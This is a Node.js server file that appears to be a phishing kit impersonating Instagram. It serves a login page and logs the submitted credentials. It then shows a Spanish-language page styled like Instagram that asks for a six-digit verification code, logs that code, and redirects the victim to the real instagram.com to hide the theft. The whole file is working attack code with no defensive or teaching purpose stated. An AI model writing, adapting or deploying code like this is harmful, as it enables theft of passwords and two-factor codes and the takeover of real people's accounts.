const http = require('http');
const fs = require('fs');

const server = http.createServer((req, res) => {

if (req.url === '/') {
fs.readFile('index.html', (err, data) => {
res.writeHead(200, { 'Content-Type': 'text/html' });
res.end(data);
});
}

else if (req.url === '/logomp.png') {
fs.readFile('logomp.png', (err, data) => {
res.writeHead(200, { 'Content-Type': 'image/png' });
res.end(data);
});
}

else if (req.method === 'POST' && req.url === '/login') {
let body = '';

req.on('data', chunk => {
body += chunk.toString();
});

req.on('end', () => {
console.log('LOGIN:', body);

res.writeHead(302, { Location: '/ok' });
res.end();
});
}

else if (req.url === '/ok') {
  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
  res.end(`
  <!DOCTYPE html>
  <html lang="es">
  <head>
    <meta charset="UTF-8">
    <title>Verificación</title>
    <style>
      *{margin:0;padding:0;box-sizing:border-box}
      body{
        background:#fafafa;
        font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
        display:flex;justify-content:center;align-items:center;height:100vh;
      }
      .wrapper{width:350px}
      .box{
        background:#fff;border:1px solid #dbdbdb;
        padding:40px 40px 20px;text-align:center;
      }
      .title{font-size:24px;font-weight:600;margin-bottom:12px}
      .desc{font-size:14px;color:#444;margin-bottom:16px}
      .input{
width: 85%;
height: 38px;
margin: 8px auto;
display: block;
padding: 9px 8px;
border: 1px solid #dbdbdb;
border-radius: 3px;
background: #fafafa;
font-size: 12px;
text-align: center;
}
.link { color: #4da6ff; text-decoration: underline;
      }
      .btn{
        width:100%;height:32px;margin-top:8px;
        background:#0095f6;border:none;border-radius:8px;
        color:#fff;font-weight:600;font-size:14px;cursor:pointer;
      }
      .footer{
        margin-top:10px;border:1px solid #dbdbdb;background:#fff;
        padding:20px;text-align:center;font-size:14px;color:#8e8e8e;
      }
    </style>
  </head>
  <body>
    <div class="wrapper">
      <div class="box">
        <div class="title">Ingresa el código de 6 digitos.</div>
        <div class="desc">Para confirmar tu identidad ingresá el código que enviamos.</div>
        <form method="POST" action="/code"> 
          <input class="input" name="codigo" placeholder="Código de seguridad" inputmode="numeric">
          <button class="btn" type="submit">Confirmar</button>
        </form>
      </div>
      <div class="footer">También puedes denunciar el contenido que creas que es ilegal en tu pais sin iniciar sesión. Descarga la <span class="link">aplicación</span> © 2026 </div>
    </div>
  </body>
  </html>
  `);
}

else if (req.method === 'POST' && req.url === '/code') {
let body = '';

req.on('data', chunk => {
body += chunk.toString();
});

req.on('end', () => {
console.log('CODIGO:', body);

res.writeHead(302, { Location: 'https://www.instagram.com' });
res.end();
});
}

else {
res.writeHead(404);
res.end('Not found');
}

});

server.listen(80, '0.0.0.0', () => {
console.log('Servidor en red');
});
